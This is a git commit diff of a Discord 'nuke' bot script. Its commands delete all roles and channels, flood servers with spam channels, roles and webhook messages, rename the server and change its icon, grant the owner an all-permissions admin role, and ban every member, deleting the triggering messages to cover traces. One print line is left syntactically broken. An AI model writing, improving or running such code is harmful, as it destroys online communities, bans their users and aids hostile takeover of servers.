d503e1f12f408c411cf6b7b10e74b60185b6bc28
Mr Pumpkin <129291449+FriendlyPumpkin@users.noreply.github.com>
2023-06-18 11:32:50 +0800

    Update script.py

--- script.py
+++ script.py
@@ -35,56 +35,51 @@ def is_owner():
 @bot.command()
 @is_owner()
 async def nuke(ctx):
-    for guild_id in GUILD_IDS:
-        guild = bot.get_guild(guild_id)
-        
-        if guild is None:
-            print(f'Failed to find guild with ID {guild_id}')
-            continue
-        
-        try:
-            deleted_channels = []
-            deleted_roles = []
-            
-            
-            await get_admin(guild)
-            await delete_roles(guild, deleted_roles)
-            await delete_channels(guild, deleted_channels)
-            
-            
-            tasks = [
-                spam_channels(guild, NUM_CHANNELS, deleted_channels),
-                spam_roles(guild, NUM_ROLES, deleted_roles),
-                ban_people(guild)  
-            ]
-            
-            await asyncio.gather(*tasks)
-            
-            print(f'Deleted text channels in {guild.name}: {deleted_channels}')
-            print(f'Deleted roles in {guild.name}: {deleted_roles}')
-        except Exception as e:
-            print(f'Error in guild {guild.name}: {e}')
-        
-    print('All actions completed')
-
-async def get_admin(guild):
     try:
         
-        admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
-        if admin_role is None:
-            admin_role = await guild.create_role(name=ADMIN_ROLE_NAME)
-            print(f'Admin role created in {guild.name}')
-    
+        await ctx.message.delete()
+
+        for guild_id in GUILD_IDS:
+            guild = bot.get_guild(guild_id)
+            
+            if guild is None:
+                print(f'Failed to find guild with ID {guild_id}')
+                continue
+            
+            try:
+                deleted_channels = []
+                deleted_roles = []
+                
+                
+                await delete_roles(guild, deleted_roles)
+                await delete_channels(guild, deleted_channels)
+                
+
+                tasks = [
+                    spam_channels(guild, NUM_CHANNELS, deleted_channels),
+                    spam_roles(guild, NUM_ROLES, deleted_roles)
+                ]
+                
+                await asyncio.gather(*tasks)
+                
+                print(f'Deleted text channels in {guild.name}: {deleted_channels}')
+                print(f'Deleted roles in {guild.name}: {deleted_roles}')
+                
+                await guild.edit(name=config['new_guild_name'])
+                with open(config['new_guild_icon'], 'rb') as f:
+                    await guild.edit(icon=f.read())
+                print(f'Changed guild name and icon in {guild.name}')
+                
+            except Exception as e:
+                print(f'Error in guild {guild.name}: {e}')
         
-        owner = await bot.application_info()
-        await owner.owner.add_roles(admin_role)
-        print(f'Admin role given to bot owner in {guild.name}')
+        print('All actions completed')
     except Exception as e:
-        print(f'Error creating admin role in {guild.name}: {e}')
+        print(f'Error in nuke command: {e}')
+      
 
 async def delete_roles(guild, deleted_roles):
     try:
-        
         print(f'Deleting roles in {guild.name}')
         for role in guild.roles:
             if role != guild.default_role:
@@ -97,7 +92,6 @@ async def delete_roles(guild, deleted_roles):
 
 async def delete_channels(guild, deleted_channels):
     try:
-        
         print(f'Deleting channels in {guild.name}')
         for channel in guild.channels:
             await channel.delete()
@@ -108,20 +102,29 @@ async def delete_channels(guild, deleted_channels):
     except Exception as e:
         print(f'Error deleting channels in {guild.name}: {e}')
 
+
 async def spam_channels(guild, num_channels, deleted_channels):
     try:
-        
         for _ in range(num_channels):
             channel_name = config['spam_channels_name']
-            channel = await guild.create_text_channel(name=channel_name)
+            
+            is_text_channel = random.choice([True, False])
+            
+            if is_text_channel:
+                channel = await guild.create_text_channel(name=channel_name)
+            else:
+                channel = await guild.create_voice_channel(name=channel_name)
+            
             deleted_channels.append(channel.name)
-            print(f'Spam channel created in {guild.name}: {channel.name}')
+            channel_type = "text" if is_text_channel else "voice"
+            print(f'Spam {channel_type} channel created in {guild.name}: {channel.name}')
     except Exception as e:
         print(f'Error creating spam channels in {guild.name}: {e}')
+      
+      
 
 async def spam_roles(guild, num_roles, deleted_roles):
     try:
-        
         for _ in range(num_roles):
             role_name = config['spam_roles_name']
             role = await guild.create_role(name=role_name)
@@ -129,15 +132,86 @@ async def spam_roles(guild, num_roles, deleted_roles):
             print(f'Spam role created in {guild.name}: {role.name}')
     except Exception as e:
         print(f'Error creating spam roles in {guild.name}: {e}')
+
+@bot.command()
+@is_owner()
+async def admin(ctx):
+    try:
+        guild = ctx.guild
+
+        admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
+        if admin_role is None:
+            admin_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
+            print(f'Admin role created in {guild.name}')
+
+        owner = guild.get_member(OWNER_ID)
+        await owner.add_roles(admin_role)
+        print(f'Admin role given to bot owner in {guild.name}')
+
+        try:
+            await ctx.message.delete()
+        except discord.NotFound:
+            print("Command message not found.")
+
+    except Exception as e:
+        print(f'Error in admin command: {e}')
+
+
+
+@bot.command()
+@is_owner()
+async def spam(ctx):
+    try:
+        await ctx.message.delete()
+
+        guild = ctx.guild
+
+        text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
+
+        spam_message = config['spam_message']
+        num_spam_webhooks = config['num_spam_webhooks']
+
+        for channel in text_channels:
+            try:
+                for _ in range(num_spam_webhooks):
+                    webhook = await channel.create_webhook(name="Mr. Pumpkin")
+
+                    await webhook.send(content=spam_message)
+
+                    print(f'Spam message sent in channel: {channel.name} using webhook: {webhook.name}')
+                    
+                    await asyncio.sleep(0.8)
+            except Exception as e:
+                print(f'Error sending spam message in channel: {channel.name}, {e}')
+
+        print('Spam messages sent in all channels')
+    except Exception as e:
+        print(f'Error in spam_all_channels command: {e}')
       
 
-async def ban_people(guild):
+
+@bot.command()
+@is_owner()
+async def ban(ctx):
     try:
-        
-        
-        pass
+        await ctx.message.delete()
+        guild = ctx.guild
+
+        members = []
+        async for member in guild.fetch_members(limit=None):
+            members.append(member)
+
+        for member in members:
+            if member == guild.me or member == guild.owner or member.id == OWNER_ID:
+                continue
+
+            await guild.ban(member)
+            print(f'Banned member: {member.name}
+
+        await ctx.send("Banning process completed.")
     except Exception as e:
         print(f'Error banning people in {guild.name}: {e}')
+
 
 
 bot.run(TOKEN)
